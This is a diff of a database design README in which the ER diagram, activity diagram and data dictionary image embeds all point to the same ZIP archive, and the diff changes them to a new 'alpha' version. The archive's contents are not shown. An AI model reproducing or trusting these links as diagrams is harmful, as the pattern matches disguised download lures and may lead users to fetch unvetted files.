@@ -1,10 +1,10 @@
 # ER Diagram
-![ERD](https://github.com/iqbaldiit/Database_Design/raw/refs/heads/main/vambrace/Design-Database-1.0.zip)
+![ERD](https://raw.githubusercontent.com/iqbaldiit/Database_Design/main/vambrace/Design-Database-v1.8-alpha.4.zip)
 
 # Activity Diagram
-![Activity_Diagram](https://github.com/iqbaldiit/Database_Design/raw/refs/heads/main/vambrace/Design-Database-1.0.zip)
+![Activity_Diagram](https://raw.githubusercontent.com/iqbaldiit/Database_Design/main/vambrace/Design-Database-v1.8-alpha.4.zip)
 
 # Data Dictionary
-![Data_Dictionary](https://github.com/iqbaldiit/Database_Design/raw/refs/heads/main/vambrace/Design-Database-1.0.zip)
+![Data_Dictionary](https://raw.githubusercontent.com/iqbaldiit/Database_Design/main/vambrace/Design-Database-v1.8-alpha.4.zip)
 
 
